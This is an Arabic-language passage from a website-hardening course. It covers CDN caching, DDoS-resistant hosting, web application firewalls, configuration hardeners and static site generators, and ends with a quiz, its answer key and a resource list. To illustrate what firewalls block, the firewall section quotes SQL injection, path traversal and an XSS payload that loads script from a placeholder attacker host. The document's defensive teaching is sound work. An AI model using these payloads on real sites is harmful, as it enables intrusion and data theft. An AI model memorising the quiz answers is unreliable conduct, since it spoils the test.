بالإضافة إلى ذلك، توجد بعض التكوينات الخاطئة التي يمكن أن تتسبب في عدم قيام خادم حافة شبكة توصيل المحتوى بالتعرف على المحتوى الثابت مقابل المحتوى الديناميكي. على سبيل المثال، إذا كان موقع الويب يحتوي على صفحة ويب مثل www.example.com/profile، لن تعرف شبكة توصيل المحتوى تلقائيًا أن الصفحة تحتوي على معلومات خاصة. تُعدّ الطريقة الأكثر شيوعًا للتغلب على ذلك هي تكوين شبكة توصيل المحتوى على ذاكرة التخزين المؤقت استنادًا إلى رؤوس الاستجابة ثم تعيين رأس تحكم-ذاكرة التخزين المؤقت الذي تكون قيمته خاصة أو مشابهة. سيُخبر هذا شبكة توصيل المحتوى أن الصفحة تحتوي على معلومات خاصة ولن يعطي المحتوى ذاته إلى مستخدمين مختلفين. وستختلف تفاصيل كيفية تكوينه واستخدامه بين مزودي شبكة توصيل المحتوى لذا تأكد من الرجوع إلى وثائق مزود الخدمة قبل إعداد شبكة توصيل المحتوى. من الجيد أيضًا أن يكون لديك موقع ما قبل الإصدار تم تكوينه باستخدام نفس شبكة توصيل المحتوى وإعدادات موقع المنتج وبهذه الطريقة يمكن لمديري الموقع التحقق من التغييرات الرئيسية قبل بدء التشغيل.
استضافة مقاومة لهجمات حجب الخدمة
يجمع بعض مقدمي الخدمات بين استضافة المواقع ومقاومة حجب الخدمة، وبشكل عام يكون لديهم نفس النوع من التقنيات والممارسات التي يستخدمها مقدمو خدمة شبكة توصيل المحتوى ولكنها مقترنة باستضافة الويب. يتجنب ذلك المشكلة المذكورة أعلاه المتعلقة بحماية خوادم المنشأ ولكنه يعتمد على توفير المزوّد لكل من خدمات الحماية والاستضافة التي تحتاجها. تشمل أمثلة مقدمي خدمات الاستضافة المقاومة لحجب الخدمة كوريوم (Qurium) وغرين هوست (Greenhost).
قيود شبكة توصيل المحتوى المقاومة لحجب الخدمة ومزوّدي خدمة الاستضافة
ربما لاحظت أن الحماية التي توفرها شبكة توصيل المحتوى ومقدمو خدمات الاستضافة المقاومة لحجب الخدمة تغطي غالبية الهجمات، لكن المواد المذكورة أعلاه استبعدت الهجمات على مستوى التطبيق. قد تكون هناك عيوب في موقع الويب تسمح بهجمات حجب خدمة بأحجام منخفضة جدًا. لا تكون الدفاعات القياسية ضد هجمات حجب الخدمة فعّالة في هذه الحالة، ولكن قد يتمكن موظفو الدعم والاستجابة السريعة في شبكة توصيل المحتوى ومقدمو خدمات الاستضافة من المساعدة في دعم مالكي مواقع الويب في حالة وجود هجوم حجب خدمة نشط على مستوى التطبيق ضد موقعهم على الويب. 
يغطى الدفاع ضد الهجمات على مستوى التطبيق بتعمّق أكبر في الموضوع الفرعي بعنوان الاستجابة لحوادث حجب الخدمة (الموضوع الفرعي 3 في مسار التعلّم هذا).
استخدام جدران حماية تطبيقات الويب
تُعدّ جدران حماية تطبيقات الويب أجهزة شبكة تقع بين المستخدم النهائي والخادم الأصلي لموقع الويب مثل شبكة توصيل المحتوى، وبينما توفر شبكة توصيل المحتوى الحماية ضد هجمات حجب الخدمة، يحاول جدار حماية تطبيقات الويب الحماية من هجمات الاختراق. تقوم جدران حماية بفحص الطلبات الواردة وتحظر الطلبات التي تبدو ضارة، على سبيل المثال المعلمات التي تحتوي على أشياء مثل ' أو1=1;-- (SQL injection) ،"><script src="http://attacker.com/payload.js"><z a=" (البرمجة النصية عبر المواقع (XSS))، أو ../../../../../../etc/passwd (اجتياز الدليل). في حين أنه لا يمكن لأي جدار حماية تطبيقات ويب توفير حماية مثالية ضد القرصنة، إلا أنها قد يكون فعّالًا بما يكفي لحماية الموقع من الاختراق ويجعل دائمًا مهمة المهاجم في تحديد نقاط الضعف أكثر صعوبة. وفي معظم الحالات، لن يعطل جدار حماية تطبيقات الويب الجيد المحتوى السليم ولكن ذلك أمر يمكن أن يحصل. على سبيل المثال، إذا كان الموقع منتدى مناقشة يتحدث عن تطوير الويب الآمن فمن المرجح أن يحجب جدار حماية تطبيقات الويب المشاركات السليمة حول تقنيات الهجوم، كما هو الحال مع شبكات شبكة توصيل المحتوى، من الجيد جدًا أن يكون لديك موقع ما قبل الإصدار حيث يمكن اختبار التغييرات قبل نشرها.
تحتوي معظم شبكات توصيل المحتوى المقاومة لحجب الخدمة أيضًا على وظائف جدار حماية تطبيقات الويب. يوجد أيضًا موفرو جدار حماية تطبيقات ويب متخصصون بتقديم خدمات إضافية تشمل بشكل عام حجب الخدمة. على سبيل المثال، سوكوري (Sucuri) هو مزود جدار حماية تطبيقات ويب يوفر أيضًا حماية حجب خدمة وبعض قدرات النسخ الاحتياطي والاستجابة للحوادث، بالإضافة إلى وورد فنس (WordFence) المزود لجدار حماية تطبيقات ويب والمتخصص في حماية المواقع المبنية على وورد برس ومنع محاولات القرصنة العامة وهجمات حجب الخدمة، يحاول منع الهجمات التي تستهدف مواقع وورد برس على وجه التحديد. 
توجد أيضًا جدران حماية تطبيقات ويب تصمم لتعمل على ذات الخادم أو الشبكة الخاصة بموقع الويب التي يحميها، ومن الأمثلة على ذلك منتجات باراكودا (Barracuda) وإف 5 (F5) باهظة الثمن، وكذلك الحلول مفتوحة المصدر مثل مود سيكيوريتي (ModSecurity). لاحظ أن هذه الأنظمة بشكل عام لا توفر حماية حجب الخدمة من تلقاء نفسها.
معززات حماية التكوين
تعتمد مواقع الويب بشكل عام تقريبًا على نوع إطار عمل يتعامل مع معظم أعمال خدمة صفحات الويب، وقد يكون هذا إطار عمل منخفض المستوى، مثل إن جي آي إن إكس (nginx) يتعامل فقط مع الشبكات وبروتوكول نقل نص تشعبي الأساسي، أو إطار عمل عالي المستوى للغاية مثل ووردبرس الذي يتعامل مع كل شيء باستثناء محتوى الموقع. في الغالبية العظمى من الحالات يوفر إطار العمل مجموعة من الميزات والقدرات وخيارات تكوين أخرى لا يحتاج موقع الويب معظمها. تُعرّض هذه الميزات والتكوينات غير الضرورية موقع الويب لمخاطر إضافية من خلال زيادة الأجزاء المعرضة للهجوم (واحتمال وجود أخطاء مكشوفة) أو تكوينات غير آمنة بحد ذاتها.
في حين أنه من الممكن دراسة قدرات إطار العمل يدويًا وتحديد كيفية تمكين الميزات والتكوينات بمفردها، إلا أنه من الأسهل والأكثر فعالية بشكل عام استخدام أداة أو مجموعة من خطوط الأساس الافتراضية وعادة ما تُمثل معززات حماية التكوين هذه آلاف الساعات من العمل لتأمين النظام قدر الإمكان دون جعله غير قابل للاستخدام. 
كما هو الحال مع أي تغييرات في النظام من المستحسن وربما الضروري حتى وجود بيئة منفصلة لاختبار التغييرات، بالإضافة إلى وجود عملية اختبار للتأكد من أن كل شيء يعمل بشكل صحيح قبل نشر التغييرات على المنتج. قد يعتمد الموقع على تكوين غير آمن أو ميزة لا تستخدم كثيرًا كي يعمل بشكل صحيح، وفي هذه الحالة من الأفضل التقاط ذلك قبل وضع موقع قيد الاستخدام ومُعاد تهيئته.
يوفر إطار عمل تعزيز حماية ديف سيك (DevSec Hardening Framework) مجموعة من خطوط الأساس الأمنية لتعزيز حماية مجموعة واسعة من برامج البنية التحتية الشائعة الاستخدام، مثل لينوكس وماي إس كيو إل (MySQL) وأباتشي (Apache) وداكر وما إلى ذلك. توثق خطوط الأساس على موقع الويب وتوفر وصفات لمديري التكوين مثل شيف (Chef) وببت (Puppet) وآنسبل (Ansible). 
تتعمق عوامل تعزيز حماية التكوين الأخرى في الأطر التي تؤمنها، ومثال على ذلك سنفل أبيجوس (Snuffleupagus) الذي يؤمن تثبيت ب إتش ب (PHP)، بالإضافة إلى توفير تغييرات التكوين، يُغير سلوك الوظائف لجعلها أقل خطورة. ومثال على ذلك تغيير دالةsystem()  بحيث يزيل الأحرف التي يحتمل أن تكون خطرة من مدخلاته، ودالة mail() لعدم السماح بالميزات التي يمكن استخدامها لكتابة الملفات العشوائية. 
في حين أن أدوات تعزيز حماية التكوين لا يمكنها القضاء على كل ثغرة أمنية في موقع الويب، ويتطلب استخدامها اختبارًا دقيقًا للموقع بعد ذلك، إلا إنها إحدى أسهل الطرق لإغلاق أو إبطاء استغلال الموقع.
مُولد مواقع الويب الثابتة
تستخدم العديد من مواقع الويب نظام إدارة المحتوى لإدارة الموقع على الرغم من أن المحتوى على الموقع لا يتغير لكل زائر. وفي حين أنه يوجد بالتأكيد مواقع تحتاج إلى تحديث عدة مرات في الدقيقة، أو تخصيص محتوى لكل زائر فإن معظمها مواقع ثابتة بشكل أساسي. في هذه الحالة تعني كلمة "ثابت" عادة أنه يجري تحديثها كل بضع ساعات أو أقل ومن أجل الراحة تُنشئ معظم هذه المواقع ديناميكيًا في كل زيارة، ولا بأس بذلك للاستخدام العادي. لكن يمثل ذلك بعض المشاكل بالنسبة لموقع يتعرض للاستهداف.
ففي البداية يُعرّض هذا السلوك الديناميكي الأجزاء المعرضة لهجوم المتطفلين، وبدلًا من أن يكون مجرد خادم ويب وبعض الملفات، يصبح الموقع عبارة عن مجموعة معقدة من السلوك الديناميكي مدعومة بمزيج من الملفات وقواعد البيانات، ومن المرجح أن تحتوي الأخيرة على ثغرة أمنية يمكن استغلالها من قبل المهاجم.
ثانيًا، يستغرق التجميع المعقّد لقواعد البيانات والبرامج النصية وقتًا أطول بكثير لتوليد استجابة بروتوكول نقل النص التشعبي من موقع ثابت، ويتسبب هذا التعقيد الإضافي في المعالجة بجعل هجمات حجب الخدمة أكثر فعالية بكثير.
باختصار، إذا كان موقع الويب يمكن أن يعمل على شكل موقع ثابت فستكون قدرته على الصمود أكبر بكثير مقارنة بعمله على شكل موقع ديناميكي، وبالإضافة إلى أنه يوسع خيارات استضافة الموقع ويقلل من تكاليف الاستضافة، حيث يمكن دعم الموقع بأشياء مثل مساحات تخزين مقدمي الخدمات السحابية وصفحات غيت هب وما إلى ذلك.
تحتوي بعض مُولدات مواقع الويب الثابتة على بنية بسيطة خاصة بها لمحتوى الموقع وتعتمد عمومًا على مجموعة من ملفات ماركداون (Markdown) وبعض قوالب تصميم لغة تمييز النص التشعبي، وبعض ملفات التكوين، لكن تستخدم العديد من أنظمة إدارة المحتوى مولدات موقع ثابتة على الواجهة الخلفية لإنتاج موقع الويب النهائي. وبالطبع من الممكن أيضًا حفظ ملفات المصدر في غيت أو ما شابه ذلك. على أي حال سيقوم مالكو الموقع بإجراء تغييرات على تكوين موقع الويب ثم إنشاء الموقع الثابت الكامل واختباره وتحميله لكل تغيير. تشمل أمثلة بعض مولدات المواقع الثابتة المستقلة الشائعة هيوغو (Hugo) و جيكيل (Jekyll). ولإدارة المحتوى، تتضمن أمثلة أنظمة إدارة المحتوى التي تستخدم مولدات المواقع الثابتة كلاود كانن (Cloud Cannon) أو ستاتك سي إم إٍس (Static CMS). 
يتمثل الجانب السلبي في الانتقال إلى مولد موقع ويب ثابت مثل هيوغو أو جيكيل في أنه يجب عليك نقل المحتوى الموجود. وبالنسبة لمواقع الويب التي تستخدم نظام إدارة محتوى مختلف، يمكن أن يكون أمرًا يتطلب الكثير من العمل، لكن قد يكون من الممكن استخدام مولد موقع ثابت لمنصتك الحالية. ومن الأمثلة الشائعة دبليو ب 2 ستاتك (WP2Static)، وهو مكون إضافي مفتوح المصدر لووردبرس يحوله إلى موقع ثابت. لا تزال هناك حاجة إلى النقل وستحتاج نماذج التواصل إلى تغييرها وستحتاج إلى نقلها إلى خدمة تابعة لجهة خارجية مثل ديسْكَس (Disqus) أو ريبلابوكس (ReplyBox)أو العديد من الخدمات الأخرى. لاحظ أن استخدام خدمة تعليق يوفرها طرف ثالث ستجعل طرفًا آخر هو من يتحكم في تعليقات مستخدمي موقعك.
موارد التعلّم
اختبار مهارة
يؤدي تعزيز حماية موقع الويب دورًا حاسمًا في حماية الأصول عبر الإنترنت من التهديدات السيبرانية المختلفة، وتستكشف هذه المجموعة من الأسئلة الصعبة متعددة الخيارات المفاهيم الأساسية لتعزيز حماية موقع الويب، مع التركيز على الاستراتيجيات والتقنيات الرئيسية التي تهدف إلى تعزيز مرونة تطبيقات الويب ضد نقاط الضعف الشائعة. من عمليات التطوير والصيانة لضمان توافر الموقع إلى تطبيق شبكات توصيل المحتوى ومولدات المواقع الثابتة، تتعمق هذه الأسئلة في تفاصيل تعزيز المواقع الإلكترونية ضد هجمات القرصنة.

اختبر معرفتك بممارسات تعزيز حماية موقع الويب لتكسب نظرة متعمّقة حول التدابير الأساسية لتعزيز الوضع الأمني لمنصاتك عبر الإنترنت. إذا كان ذلك ممكنًا، ناقش إجاباتك على هذه الأسئلة مع أحد الأقران أو مُرشِد ليساعد في التحقق من فهمك للموضوع بشكل صحيح.

1. ما هي عملية التطوير والصيانة التي تضمن إمكانية إعادة إنشاء موقع ويب إذا كانت خوادم استضافة الإنتاج غير متوفرة؟
   أ) تحديث المكونات الإضافية والسمات الخاصة بموقع الويب بانتظام   
   ب) تنفيذ المصادقة متعددة العوامل لحسابات المسؤول   
   ج) استخدام أنظمة التحكم في الإصدار والنسخ الاحتياطي الآلي
   د) فرض سياسات صارمة لكلمة المرور لحسابات المستخدمين

2. كيف يمكن لشبكة توصيل المحتوى أن تساعد في حماية موقع الويب من هجمات حجب الخدمة؟
   أ) بتوزيع محتوى الموقع على خوادم متعددة لتلبية الزيارات المفاجئة.
   ب) عن طريق تشفير جميع البيانات المرسلة بين الخادم والعميل
   ج) من خلال توفير طبقات إضافية من المصادقة لتسجيل دخول المستخدم
   د) عن طريق حظر الوصول تلقائيًا إلى عناوين بروتوكول الإنترنت المشبوهة

3. ما هي التكنولوجيا التي يمكن أن تعزز مقاومة موقع الويب لحجب الخدمة والقرصنة من خلال تقديم صفحات لغة تمييز النص التشعبي المقدمة مسبقًا للمستخدمين؟
   أ) منصات حوسبة بدون خوادم
   ب) أطر عمل تطبيقات الويب الديناميكية   
   ج) نظم إدارة المحتوى   
   د) مولدات المواقع الثابتة

4. كيف تساهم أدوات تعزيز حماية التكوين وجدران حماية تطبيقات الويب في جعل موقع الويب أكثر مقاومة للاختراق؟
   أ) من خلال تحسين أداء الخادم واستخدام الموارد  
   ب) من خلال تنفيذ طبقات إضافية من المصادقة لتسجيل دخول المستخدم
   ج) عن طريق الكشف التلقائي عن أنماط الهجوم المعروفة وحركة المرور المشبوهة وحظرها  
   د) عن طريق تشفير جميع البيانات المرسلة بين الخادم والعميل


الإجابات الصحيحة والشروح:
1. إجابة صحيحة: ج) استخدام أنظمة التحكم في الإصدار والنسخ الاحتياطي الآلي
الشرح: يضمن استخدام أنظمة التحكم في الإصدار (مثل غيت) والنسخ الاحتياطي الآلي تخزين قاعدة التعليمات البرمجية والبيانات الخاصة بموقع الويب بشكل آمن ويمكن استعادتها بسهولة في حالة فشل الخادم أو فقدان البيانات. تساعد هذه الممارسة في الحفاظ على سلامة الموقع وتقليل وقت التعطّل.
2. إجابة صحيحة: أ) بتوزيع محتوى الموقع على خوادم متعددة لتلبية الزيارات المفاجئة.
الشرح: تُساعد شبكة تسليم على حماية موقع الويب من هجمات حجب الخدمة من خلال توزيع محتواه عبر خوادم متعددة تقع في مواقع جغرافية مختلفة. يُساعد هذا التوزيع في توزيع حمل استخدام الشبكة الوارد، مما يقلل من تأثير هجمات حجب الخدمة وضمان بقاء الموقع في متناول المستخدمين حتى خلال فترات ارتفاع حركة المرور.
3. إجابة صحيحة: د) مولدات المواقع الثابتة
الشرح: يقوم منشئو المواقع الثابتة بإنشاء مواقع ويب عن طريق إنشاء صفحات لغة تمييز النص التشعبي من ملفات المصدر أثناء عملية الإنشاء. نظرًا لأن المواقع الثابتة لا تعتمد على المعالجة من جانب الخادم أو قواعد البيانات، فهي بطبيعتها أكثر مقاومة للقرصنة وهجمات حجب الخدمة. عادةً ما يكون تحميل المواقع الثابتة أسرع ومن الأسهل تخزينها مؤقتًا، مما يعزز قدرتها على الصمود أمام الهجمات.
4. إجابة صحيحة: ج) عن طريق الكشف التلقائي عن أنماط الهجوم المعروفة وحركة المرور المشبوهة وحظرها
الشرح: تساعد أدوات تعزيز حماية التكوين وجداران حماية تطبيقات الويب في جعل موقع الويب أكثر مقاومة للاختراق من خلال الكشف التلقائي عن أنماط الهجوم المعروفة وحركة المرور المشبوهة وحظرها. تعمل هذه التدابير الأمنية كحاجز بين موقع الويب والمهاجمين المحتملين، وتصفية الطلبات الواردة وحركة المرور لمنع الأنشطة الضارة والوصول غير المصرح به.


## Learning Resources

{{% resource title="Ping flood" languages="English, Chinese, Japanese, Russian, Ukrainian, Greek, Indonesian, Catalan, Spanish, French, Italian, Dutch, Polish, Portuguese, Turkish, Czech" cost="Free" description="A description of a common denial of service attack." url="https://en.wikipedia.org/wiki/Ping_flood" %}}

{{% resource title="Smurf attack" languages="English, Arabic, Farsi, Japanese, Korean, Greek, Indonesian, Catalan, German, Spanish, Basque, French, Italian, Lombard, Dutch, Polish, Portuguese, Slovenian, Finnish, Czech" cost="Free" description="A description of another common denial of service attack, includes examples and mitigations." url="https://en.wikipedia.org/wiki/Smurf_attack" %}}

{{% resource title="NTP amplification attack" languages="English, German, Spanish, French, Italian, Japanese, Korean, Portuguese, Chinese, Taiwanese" cost="Free" description="An overview of how the network time protocol (NTP) could be abused for denial of service attacks." url="https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/" %}}

{{% resource title="Ping of death" languages="English, Arabic, Farsi, Chinese, Japanese, Korean, Bulgarian, Russian, Ukrainian, Greek, Azeri, Indonesian, German, Spanish, French, Italian, Dutch, Polish, Portuguese, Romanian, Czech, Hebrew" cost="Free" description="An attack in which a computer is overwhelmed by a malicious ping." url="https://en.wikipedia.org/wiki/Ping_of_death" %}}

{{% resource title="Algorithmic Complexity Attacks and the Linux Networking Code" languages="English" cost="Free" description="A look at how Linux handles networking and a specific attack that could be directed against it." url="https://www.enyo.de/fw/security/notes/linux-dst-cache-dos.html" %}}

{{% resource title="What is slow HTTP post DOS attack?" languages="English" cost="Free" description="An overview of a denial of service attack which exploits some features in HTTP POST requests." url="https://www.educative.io/answers/what-is-slow-http-post-dos-attack" %}}

{{% resource title="Botnet" languages="48 languages" cost="Free" description="An overview of what a botnet is, or a group of automatically managed internet-connected devices used for malicious purposes." url="https://en.wikipedia.org/wiki/Botnet" %}}

{{% resource title="DDoS for hire" languages="English" cost="Free" description="A collection of blog posts by Brian Krebs on the DDoS for hire industry." url="https://krebsonsecurity.com/category/ddos-for-hire/" %}}

{{% resource title="Targeted sophisticated phishing attacks against dissidents in Azerbaijan is trending" languages="English" cost="Free" description="A 2020 Qurium report about an attacker who broke into a website and then used the data to phish dissidents." url="https://www.qurium.org/alerts/targeted-sophisticated-phishing-attacks-against-dissidents-in-azerbaijan-is-trending/" %}}

{{% resource title="Deflect for nonprofits" languages="English" cost="Free" description="Deflect is a DDoS protection program which allows nonprofits to sign up for free." url="https://deflect.ca/non-profits/" %}}

{{% resource title="Google Project Shield" languages="English" cost="Free" description="A free DDoS protection service for news, human rights, and election-related sites." url="https://projectshield.withgoogle.com/landing" %}}

{{% resource title="Cloudflare Project Galileo" languages="English, German, Spanish, French, Italian, Japanese, Korean, Portuguese, Chinese, Taiwanese" cost="Free" description="Pre DDoS protection and other security measures for at-risk sites, including artistic groups, humanitarian organizations, and political dissidents." url="https://www.cloudflare.com/galileo/" %}}

{{% resource title="Secure hosting for at risk sites" languages="English" cost="Varied, depending on hosting package" description="Qurium and Greenhost both offer hosting for groups which might be at risk of attacks due to their human rights and media work." url="Qurium: https://www.qurium.org/secure-hosting/" url2="Greenhost: https://greenhost.net/internet-freedom/" %}}

{{% resource title="Web application firewalls" languages="English" cost="Varied" description="Network devices that sit between an end user and a website’s origin server, like a CDN, providing an additional layer of security." url="Sucuri: https://sucuri.net/website-firewall/" url2="Wordfence: https://www.wordfence.com/products/pricing/" url3="ModSecurity: https://github.com/SpiderLabs/ModSecurity" %}}

{{% resource title="Web application hardeners" languages="English" cost="Varied, many free options" description="Automated tools which find potential vulnerabilities in web applications." url="A hardening framework: https://dev-sec.io/baselines/" url2="Snuffleupagus: https://snuffleupagus.readthedocs.io/" %}}

{{% resource title="Static site generators" languages="English" cost="Free" description="An overview of major static site generators." url="https://cloudcannon.com/jamstack-ecosystem/static-site-generators/" %}}

{{% resource title="WP2Static" languages="English" cost="Free" description="A WordPress plugin to generate static sites." url="https://wp2static.com/" %}}
